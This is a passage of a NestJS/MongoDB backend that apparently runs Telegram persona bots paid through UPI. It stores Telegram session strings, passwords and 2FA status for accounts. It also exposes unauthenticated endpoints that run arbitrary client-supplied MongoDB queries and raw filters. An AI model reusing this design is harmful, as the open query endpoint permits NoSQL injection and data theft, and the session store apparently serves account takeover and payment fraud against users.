transactionId: string;\r\n\r\n  @ApiProperty({ description: 'Amount involved in the transaction.' })\r\n  amount: number;\r\n\r\n  @ApiProperty({ description: 'Issue type reported by the user.' })\r\n  issue: string;\r\n  \r\n  @ApiProperty({ description: 'Description of issue reported by the user.' })\r\n  description: string;\r\n\r\n  @ApiProperty({ description: 'Refund method selected by the user.' })\r\n  refundMethod: string;\r\n\r\n  @ApiProperty({ description: 'User profile ID.' })\r\n  profile: string;\r\n\r\n  @ApiProperty({ description: 'User chat ID.' })\r\n  chatId: string;\r\n\r\n  @ApiProperty({ description: 'IP address of the user.' })\r\n  ip: string;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './create-transaction.dto';\r\n\r\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\n@Schema({ timestamps: true })\nexport class Transaction extends Document {\n  @Prop({ required: false })\n  transactionId: string;\n\n  @Prop({ required: false })\n  amount: number;\n\n  @Prop({ required: false })\n  issue: string;\n\n  @Prop({ required: false })\n  description: string;\n\n  @Prop()\n  refundMethod: string;\n\n  @Prop({ required: false })\n  profile: string;\n\n  @Prop({ required: false })\n  chatId: string;\n\n  @Prop({ required: false })\n  ipAddress: string;\n}\n\nexport const TransactionSchema = SchemaFactory.createForClass(Transaction);\n","import { Body, Controller, Get, Post, Put, Delete, Param, Query } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse } from '@nestjs/swagger';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { TransactionService } from './transaction.service';\r\n\r\n@ApiTags('Transactions')\r\n@Controller('transactions')\r\nexport class TransactionController {\r\n  constructor(private readonly transactionService: TransactionService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new transaction' })\r\n  @ApiResponse({ status: 201, description: 'Transaction created successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input.' })\r\n  async create(@Body() createTransactionDto: CreateTransactionDto) {\r\n    return this.transactionService.create(createTransactionDto);\r\n  }\r\n\r\n  @Get(':id')\r\n  @ApiOperation({ summary: 'Get transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction retrieved successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async findOne(@Param('id') id: string) {\r\n    return this.transactionService.findOne(id);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all transactions or search transactions' })\r\n  @ApiResponse({ status: 200, description: 'Transactions retrieved successfully.' })\r\n  async findAll(\r\n    @Query('search') search?: string,\r\n    @Query('limit') limit?: number,\r\n    @Query('offset') offset?: number,\r\n  ) {\r\n    return this.transactionService.findAll(search, limit, offset);\r\n  }\r\n\r\n  @Put(':id')\r\n  @ApiOperation({ summary: 'Update a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction updated successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async update(\r\n    @Param('id') id: string,\r\n    @Body() updateTransactionDto: UpdateTransactionDto,\r\n  ) {\r\n    return this.transactionService.update(id, updateTransactionDto);\r\n  }\r\n\r\n  @Delete(':id')\r\n  @ApiOperation({ summary: 'Delete a transaction by ID' })\r\n  @ApiResponse({ status: 200, description: 'Transaction deleted successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Transaction not found.' })\r\n  async delete(@Param('id') id: string) {\r\n    return this.transactionService.delete(id);\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { TransactionService } from './transaction.service';\r\nimport { TransactionController } from './transaction.controller';\r\nimport { Transaction, TransactionSchema } from './schemas/transaction.schema';\r\n\r\n@Module({\r\n  imports: [\r\n    MongooseModule.forFeature([\r\n      { name: Transaction.name, schema: TransactionSchema },\r\n    ]),\r\n  ],\r\n  controllers: [TransactionController],\r\n  providers: [TransactionService],\r\n  exports:[TransactionService]\r\n})\r\nexport class TransactionModule {}\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateTransactionDto } from './dto/create-transaction.dto';\r\nimport { UpdateTransactionDto } from './dto/update-transaction.dto';\r\nimport { Transaction } from './schemas/transaction.schema';\r\n\r\n@Injectable()\r\nexport class TransactionService {\r\n  constructor(\r\n    @InjectModel(Transaction.name) private readonly transactionModel: Model<Transaction>,\r\n  ) {}\r\n\r\n  async create(createTransactionDto: CreateTransactionDto): Promise<Transaction> {\r\n    const newTransaction = new this.transactionModel(createTransactionDto);\r\n    return await newTransaction.save();\r\n  }\r\n\r\n  async findOne(id: string): Promise<Transaction> {\r\n    const transaction = await this.transactionModel.findById(id).exec();\r\n    if (!transaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return transaction;\r\n  }\r\n\r\n  async findAll(\r\n    search?: string,\r\n    limit = 10,\r\n    offset = 0,\r\n  ): Promise<{ transactions: Transaction[]; total: number }> {\r\n    const query = search\r\n      ? {\r\n          $or: [\r\n            { transactionId: { $regex: search, $options: 'i' } },\r\n            { issue: { $regex: search, $options: 'i' } },\r\n            { profile: { $regex: search, $options: 'i' } },\r\n            { chatId: { $regex: search, $options: 'i' } },\r\n          ],\r\n        }\r\n      : {};\r\n\r\n    const transactions = await this.transactionModel\r\n      .find(query)\r\n      .skip(offset)\r\n      .limit(limit)\r\n      .exec();\r\n    const total = await this.transactionModel.countDocuments(query).exec();\r\n\r\n    return { transactions, total };\r\n  }\r\n\r\n  async update(id: string, updateTransactionDto: UpdateTransactionDto): Promise<Transaction> {\r\n    const updatedTransaction = await this.transactionModel\r\n      .findByIdAndUpdate(id, updateTransactionDto, { new: true })\r\n      .exec();\r\n    if (!updatedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return updatedTransaction;\r\n  }\r\n\r\n  async delete(id: string): Promise<Transaction> {\r\n    const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();\r\n    if (!deletedTransaction) {\r\n      throw new NotFoundException('Transaction not found');\r\n    }\r\n    return deletedTransaction;\r\n  }\r\n}\r\n","import { Controller, Get, Body, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { UpiIdService } from './upi-ids.service';\r\n\r\n@ApiTags('UPI Ids')\r\n@Controller('upi-ids')\r\nexport class UpiIdController {\r\n  constructor(private readonly UpiIdService: UpiIdService) { }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get Upi Ids' })\r\n  async findOne(): Promise<any> {\r\n    return this.UpiIdService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update Upi Ids' })\r\n  @ApiBody({ type: Object })\r\n  async update(@Body() updateUpiIdsdto: any): Promise<any> {\r\n    return this.UpiIdService.update(updateUpiIdsdto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UpiIdService } from './upi-ids.service';\r\nimport { UpiIdController } from './upi-ids.controller';\r\nimport { UpiIdSchema } from './upi-ids.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    UpiIdModule,\r\n    NpointModule,\r\n    MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: UpiIdSchema }]),\r\n  ],\r\n  providers: [UpiIdService],\r\n  controllers: [UpiIdController],\r\n  exports: [UpiIdService],\r\n})\r\nexport class UpiIdModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type UpiIdDocument = UpiId & Document;\r\n\r\n@Schema({\r\n  versionKey: false, autoIndex: true, strict: false, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class UpiId { }\r\n\r\nexport const UpiIdSchema = SchemaFactory.createForClass(UpiId);\r\nUpiIdSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UpiId } from './upi-ids.schema';\r\nimport axios from 'axios';\r\nimport { areJsonsNotSame, mapToJson } from '../../utils';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class UpiIdService {\r\n    private upiIds = {}\r\n    constructor(@InjectModel('UpiIdModule') private UpiIdModel: Model<UpiId>,\r\n        private npointSerive: NpointService\r\n    ) {\r\n        this.UpiIdModel.findOne({}).exec().then((data) => {\r\n            this.upiIds = data;\r\n            console.log(\"Refreshed UPIs\")\r\n        })\r\n        setInterval(async () => {\r\n            await this.refreshUPIs();\r\n            await this.checkNpoint();\r\n        }, 5 * 60 * 1000);\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async refreshUPIs() {\r\n        console.log(\"Refreshed UPIs\")\r\n        this.upiIds = await this.UpiIdModel.findOne({}).exec();\r\n    }\r\n\r\n    async checkNpoint() {\r\n        const upiIds = (await axios.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;\r\n        const existingUpiIds = await this.findOne();\r\n        if (areJsonsNotSame(upiIds, existingUpiIds)) {\r\n            await this.npointSerive.updateDocument(\"54baf762fd873c55c6b1\", this.upiIds)\r\n        }\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        if (Object.keys(this.upiIds).length > 0) {\r\n            return this.upiIds\r\n        }\r\n        const result = await this.UpiIdModel.findOne({}).exec();\r\n        this.upiIds = result\r\n        console.log(\"Refreshed UPIs\")\r\n        return result\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.UpiIdModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        this.upiIds = updatedUser;\r\n        console.log(\"Refreshed UPIs\")\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`UpiIdModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateUserDataDto {\n    @ApiProperty({ example: '5787751360', description: 'Chat ID' })\n    chatId: string;\n\n    @ApiProperty({ example: 1, description: 'Total count' })\n    totalCount: number;\n\n    @ApiProperty({ example: 0, description: 'Picture count' })\n    picCount: number;\n\n    @ApiProperty({ example: 1718802722566, description: 'Last message timestamp' })\n    lastMsgTimeStamp: number;\n\n    @ApiProperty({ example: 1718802742567, description: 'Limit time' })\n    limitTime: number;\n\n    @ApiProperty({ example: 0, description: 'Paid count' })\n    paidCount: number;\n\n    @ApiProperty({ example: 0, description: 'Profile count' })\n    prfCount: number;\n\n    @ApiProperty({ example: 1, description: 'Can reply' })\n    canReply: number;\n\n    @ApiProperty({ example: 0, description: 'Pay amount' })\n    payAmount: number;\n\n    @ApiProperty({ example: 0, description: 'highestPayAmount' })\n    highestPayAmount: number;\n\n    @ApiProperty({ example: 0, description: 'cheatCount', default: 0 })\n    cheatCount: number;\n\n    @ApiProperty({ example: 0, description: 'callTime', default: 0 })\n    callTime: number;\n\n    @ApiProperty({ example: 'بـِـعٰ۬ێډ الۿٰٕقاوٰ۬ێ ٴ🦅', description: 'Username' })\n    username: string;\n\n    @ApiProperty({ example: '-7250939091939055173', description: 'Access hash' })\n    accessHash: string;\n\n    @ApiProperty({ example: true, description: 'Paid reply status' })\n    paidReply: boolean;\n\n    @ApiProperty({ example: false, description: 'Demo given status' })\n    demoGiven: boolean;\n\n    @ApiProperty({ example: false, description: 'Second show status' })\n    secondShow: boolean;\n\n    @ApiProperty({ example: 'sneha', description: 'Profile name' })\n    profile: string;\n\n    @ApiProperty({ example: false, description: 'Pics Sent status' })\n    picsSent: boolean;\n\n    @ApiProperty({ example: [], description: 'videos' })\n    videos: number[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams } from 'class-transformer';\r\n\r\nexport class SearchDto {\r\n  @ApiPropertyOptional({ description: 'Total count', type: Number })\r\n  totalCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Picture count', type: Number })\r\n  picCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Last message timestamp', type: Number })\r\n  lastMsgTimeStamp?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Limit time', type: Number })\r\n  limitTime?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid count', type: Number })\r\n  paidCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile count', type: Number })\r\n  prfCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Can reply', type: Number })\r\n  canReply?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Pay amount', type: Number })\r\n  payAmount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Username' })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Access hash' })\r\n  accessHash?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Paid reply status', type: Boolean })\r\n  paidReply?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Demo given status', type: Boolean })\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Second show status', type: Boolean })\r\n  secondShow?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Profile name' })\r\n  @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\r\n  profile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Chat ID' })\r\n  chatId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Pics Sent status' })\r\n  picsSent?: boolean;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateUserDataDto } from './create-user-data.dto';\n\nexport class UpdateUserDataDto extends PartialType(CreateUserDataDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type UserDataDocument = UserData & Document;\n\n@Schema({\n    collection: 'userData', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class UserData {\n    @Prop({ required: true })\n    chatId: string;\n\n    @Prop({ required: true })\n    totalCount: number;\n\n    @Prop({ required: true })\n    picCount: number;\n\n    @Prop({ required: true })\n    lastMsgTimeStamp: number;\n\n    @Prop({ required: true })\n    limitTime: number;\n\n    @Prop({ required: true })\n    paidCount: number;\n\n    @Prop({ required: true })\n    prfCount: number;\n\n    @Prop({ required: true })\n    canReply: number;\n\n    @Prop({ required: true })\n    payAmount: number;\n\n    @Prop({ required: true })\n    username: string;\n\n    @Prop({ required: true })\n    accessHash: string;\n\n    @Prop({ required: true })\n    paidReply: boolean;\n\n    @Prop({ required: true })\n    demoGiven: boolean;\n\n    @Prop({ required: true })\n    secondShow: boolean;\n\n    @Prop({ required: true, default: 0 })\n    fullShow: number;\n\n    @Prop({ required: true })\n    profile: string;\n\n    @Prop({ required: true })\n    picSent: boolean;\n\n    @Prop({ required: true })\n    highestPayAmount: number;\n\n    @Prop({ required: true })\n    cheatCount: number;\n\n    @Prop({ required: true })\n    callTime: number;\n\n    @Prop({ required: false, default:[] })\n    videos: number[];\n}\n\nexport const UserDataSchema = SchemaFactory.createForClass(UserData);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { UserDataService } from './user-data.service';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UserData } from './schemas/user-data.schema';\r\nimport { SearchDto } from './dto/search-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\n\r\n@ApiTags('UserData of TG clients')\r\n@Controller('userData')\r\nexport class UserDataController {\r\n  constructor(private readonly userDataService: UserDataService) {}\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.create(createUserDataDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchDto): Promise<UserData[]> {\r\n    return this.userDataService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<UserData[]> {\r\n    return this.userDataService.findAll();\r\n  }\r\n\r\n\r\n  @Patch('updateAll/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async updateAll(@Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n    return this.userDataService.updateAll(chatId, updateUserDataDto);\r\n  }\r\n\r\n\r\n  @Get(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.findOne(profile, chatId);\r\n  }\r\n\r\n  @Patch(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('profile') profile: string, @Param('chatId') chatId: string, @Body() updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n    return this.userDataService.update(profile, chatId, updateUserDataDto);\r\n  }\r\n\r\n  @Delete(':profile/:chatId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('profile') profile: string, @Param('chatId') chatId: string): Promise<UserData> {\r\n    return this.userDataService.remove(profile, chatId);\r\n  }\r\n\r\n  @Get('clear-count')\r\n  clearCount(@Query('chatId') chatId?: string) {\r\n    return this.userDataService.clearCount(chatId);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    try {\r\n      const { query, sort, limit, skip } = requestBody;\r\n      return await this.userDataService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw error;\r\n    }\r\n  }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { UserData, UserDataSchema } from './schemas/user-data.schema';\r\nimport { UserDataService } from './user-data.service';\r\nimport { UserDataController } from './user-data.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: UserData.name, schema: UserDataSchema, collection: \"userData\" }])],\r\n  controllers: [UserDataController],\r\n  providers: [UserDataService],\r\n  exports: [UserDataService]\r\n})\r\nexport class UserDataModule { }\r\n","import { BadRequestException, Injectable, InternalServerErrorException, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { UserData, UserDataDocument } from './schemas/user-data.schema';\r\nimport { CreateUserDataDto } from './dto/create-user-data.dto';\r\nimport { UpdateUserDataDto } from './dto/update-user-data.dto';\r\nimport { parseError } from '../../utils';\r\n\r\n@Injectable()\r\nexport class UserDataService {\r\n    private callCounts: Map<string, number> = new Map();\r\n    constructor(@InjectModel(UserData.name) private userDataModel: Model<UserDataDocument>) {}\r\n\r\n    async create(createUserDataDto: CreateUserDataDto): Promise<UserData> {\r\n        const createdUser = new this.userDataModel(createUserDataDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<UserData[]> {\r\n        return await this.userDataModel.find().exec();\r\n    }\r\n\r\n    async findOne(profile: string, chatId: string): Promise<UserData & { count?: number }> {\r\n        const user = (await this.userDataModel.findOne({ profile, chatId }).exec())?.toJSON();\r\n        if (!user) {\r\n            console.warn(`UserData with ID \"${profile} - ${chatId}\" not found`);\r\n        }\r\n        const currentCount = this.callCounts.get(chatId) || 0;\r\n        this.callCounts.set(chatId, currentCount + 1);\r\n        if (user) {\r\n            return { ...user, count: this.callCounts.get(chatId) };\r\n        } else {\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    clearCount(chatId?: string): string {\r\n        if (chatId) {\r\n            this.callCounts.delete(chatId);\r\n            return `Count cleared for chatId: ${chatId}`;\r\n        } else {\r\n            this.callCounts.clear();\r\n            return 'All counts cleared.';\r\n        }\r\n    }\r\n\r\n    async update(profile: string, chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<UserData> {\r\n        delete updateUserDataDto['_id']\r\n        console.log(updateUserDataDto)\r\n        const updatedUser = await this.userDataModel.findOneAndUpdate({ profile, chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async updateAll(chatId: string, updateUserDataDto: UpdateUserDataDto): Promise<any> {\r\n        delete updateUserDataDto['_id']\r\n        const updatedUser = await this.userDataModel.updateMany({ chatId }, { $set: updateUserDataDto }, { new: true, upsert: true }).exec();\r\n        if (!updatedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(profile: string, chatId: string): Promise<UserData> {\r\n        const deletedUser = await this.userDataModel.findOneAndDelete({ profile, chatId }).exec();\r\n        if (!deletedUser) {\r\n            console.warn(`UserData with ID \"${chatId}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<UserData[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.userDataModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<UserData[]> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.userDataModel.find(query);\r\n\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    async resetPaidUsers() {\r\n        try {\r\n            const entry = await this.userDataModel.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 30 } }] }, {\r\n                $set: {\r\n                    totalCount: 10,\r\n                    limitTime: Date.now(),\r\n                    paidReply: true\r\n                }\r\n            });\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n}\r\n","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class CreateUserDto {\n  @ApiProperty({ description: 'Mobile number of the user', example: '917330803480' })\n  mobile: string;\n\n  @ApiProperty({ description: 'Session information of the user', example: 'string' })\n  session: string;\n\n  @ApiProperty({ description: 'First name of the user', example: 'Praveen' })\n  firstName: string;\n\n  @ApiProperty({ description: 'Last name of the user', example: null })\n  lastName?: string | null;\n\n  @ApiProperty({ description: 'Username of the user', example: null })\n  username?: string | null;\n\n  @ApiProperty({ description: 'Number of channels', example: 56 })\n  channels: number;\n\n  @ApiProperty({ description: 'Number of personal chats', example: 74 })\n  personalChats: number;\n\n  @ApiProperty({ description: 'Number of messages', example: 0 })\n  msgs: number;\n\n  @ApiProperty({ description: 'Total number of chats', example: 195 })\n  totalChats: number;\n\n  @ApiProperty({ description: 'Timestamp of last active', example: '2024-06-03' })\n  lastActive: string;\n\n  @ApiProperty({ description: 'Telegram ID of the user', example: '2022068676' })\n  tgId: string;\n\n  @ApiProperty({ description: 'TwoFA status', example: false })\n  twoFA: boolean = false;\n\n  @ApiProperty({ description: 'Expiration status', example: false })\n  expired: boolean = false;\n\n  @ApiProperty({ description: 'password', example: \"pass\" })\n  password: string = null;\n\n  @ApiProperty({ description: 'Number of movies', example: 0 })\n  movieCount: number = 0;\n\n  @ApiProperty({ description: 'Number of photos', example: 0 })\n  photoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of videos', example: 0 })\n  videoCount: number = 0;\n\n  @ApiProperty({ description: 'Gender of the user', example: null })\n  gender?: string | null;\n\n  @ApiProperty({ description: 'Number of other photos', example: 0 })\n  otherPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of other videos', example: 0 })\n  otherVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own photos', example: 0 })\n  ownPhotoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of own videos', example: 0 })\n  ownVideoCount: number = 0;\n\n  @ApiProperty({ description: 'Number of contacts', example: 105 })\n  contacts: number = 0;\n\n  @ApiProperty({\n    description: 'Call details of the user',\n    example: {\n      outgoing: 1,\n      incoming: 0,\n      video: 1,\n      chatCallCounts: [],\n      totalCalls: 1,\n    },\n  })\n  calls: {\n    outgoing: number;\n    incoming: number;\n    video: number;\n    chatCallCounts: any[];\n    totalCalls: number;\n  };\n\n  @ApiPropertyOptional({\n    description: 'Call details of the user',\n    example: []\n  })\n  recentUsers: any[];\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Transform, TransformFnParams, Type } from 'class-transformer';\r\nimport { IsOptional, IsBoolean, IsNumber, IsString } from 'class-validator';\r\n\r\nexport class SearchUserDto {\r\n  @ApiPropertyOptional({ description: 'Filter by Telegram ID' })\r\n  @IsOptional()\r\n  @IsString()\r\n  tgId?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by mobile number' })\r\n  @IsOptional()\r\n  @IsString()\r\n  mobile?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by twoFA status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  twoFA?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by Expiration status', type: Boolean })\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  expired?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by session' })\r\n  @IsOptional()\r\n  @IsString()\r\n  session?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by first name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  firstName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last name' })\r\n  @IsOptional()\r\n  @IsString()\r\n  lastName?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by username' })\r\n  @IsOptional()\r\n  @IsString()\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by channels count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  channels?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by personal chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  personalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by demo given status', type: Boolean })\r\n  @Transform(({ value }: TransformFnParams) => value === 'true' || value === true)\r\n  @IsOptional()\r\n  @IsBoolean()\r\n  demoGiven?: boolean;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by messages count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  msgs?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by total chats count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  totalChats?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by last active timestamp' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  lastActive?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by movie count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  movieCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  photoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  videoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by gender' })\r\n  @IsOptional()\r\n  @IsString()\r\n  gender?: string;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by other video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  otherVideoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own photo count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownPhotoCount?: number;\r\n\r\n  @ApiPropertyOptional({ description: 'Filter by own video count' })\r\n  @IsOptional()\r\n  @IsNumber()\r\n  ownVideoCount?: number;\r\n}\r\n","import { PartialType } from '@nestjs/mapped-types';\r\nimport { CreateUserDto } from './create-user.dto';\r\n\r\nexport class UpdateUserDto extends PartialType(CreateUserDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose from 'mongoose';\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\n\nexport type UserDocument = User & Document;\n\n@Schema({\n  collection: 'users', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class User {\n  @ApiProperty()\n  @Prop({ required: true, unique: true })\n  mobile: 